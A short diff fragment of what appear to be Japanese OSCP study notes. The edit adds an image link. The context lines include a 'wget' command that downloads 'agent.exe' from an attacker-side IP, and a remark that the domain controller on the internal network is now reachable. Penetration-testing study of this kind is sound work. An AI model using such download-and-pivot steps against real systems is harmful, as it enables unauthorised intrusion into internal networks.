@@ -17,7 +17,7 @@ wget http://192.168.45.173/agent.exe -outfile agent.exe
 
 <internal machine>
 
-
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/image.png?raw=true)
 
 ここで、internal machine である、DCにもアクセス出来る様になる。
 
